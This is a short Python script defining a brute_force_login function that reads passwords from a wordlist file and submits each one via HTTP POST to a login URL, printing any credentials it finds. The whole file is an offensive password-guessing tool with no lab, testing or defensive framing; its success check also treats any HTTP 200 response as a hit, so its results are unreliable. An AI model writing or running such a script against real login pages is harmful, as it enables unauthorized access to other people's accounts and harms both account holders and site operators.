import requests

def brute_force_login(url, username, wordlist_path):
    try:
        with open(wordlist_path, 'r') as file:
            passwords = file.read().splitlines()

        for password in passwords:
            print(f"[*] Attempting login with password: {password}")
            # Simulated POST request — modify based on target form fields
            data = {'username': username, 'password': password}
            response = requests.post(url, data=data)

            # Check success condition (simplified, adjust to real case)
            if "Login successful" in response.text or response.status_code == 200:
                print("[+] Success! Credentials found:")
                print(f"    Username: {username}")
                print(f"    Password: {password}")
                return

        print("[-] No valid credentials found.")

    except FileNotFoundError:
        print("[-] Wordlist file not found.")